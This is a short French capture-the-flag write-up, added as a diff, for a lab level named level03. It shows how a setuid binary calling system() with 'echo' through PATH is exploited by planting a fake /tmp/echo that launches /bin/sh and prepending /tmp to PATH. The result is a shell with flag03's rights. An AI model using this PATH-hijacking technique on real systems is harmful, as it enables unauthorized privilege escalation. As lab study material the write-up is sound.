@@ -1,0 +1,44 @@
+Definition:
+
+La fonction system() exécute une commande en utilisant la variable d’environnement PATH.  
+Si une commande appelée (comme `echo`) est remplacée dans le PATH, c’est la version modifiée qui sera exécutée.
+
+Piste:
+Lister le contenu du répertoire home :
+
+$ ls -l  
+
+→ On voit un exécutable `level03`.
+
+Copier l’exécutable sur ma machine locale pour analyse :  
+dans un terminal hors de la vm
+
+$ scp -P 4242 level03@10.11.248.91:/home/user/level03/level03 ~/Desktop/
+
+Outil:
+Analyse du binaire (Dogbolt / Ghidra).  
+Dans la fonction main, on voit :  
+
+system("/usr/bin/env echo Exploit me")
+
+Cela signifie qu’il appelle `echo` via `/usr/bin/env`.  
+Donc `echo` est recherché dans le PATH → vulnérabilité d’injection.
+
+Exploitation:
+Créer un faux binaire `echo` qui ouvre un shell :  
+
+$ echo "/bin/sh" > /tmp/echo  
+$ chmod +x /tmp/echo  
+
+Modifier le PATH pour que /tmp soit en priorité :  
+
+$ export PATH=/tmp:$PATH  
+
+Exécuter le binaire :  
+
+$ ./level03  
+
+→ Cela exécute `/bin/sh` avec les droits de flag03 et permet de récupérer le flag.
+
+donc on tape juste
+getflag
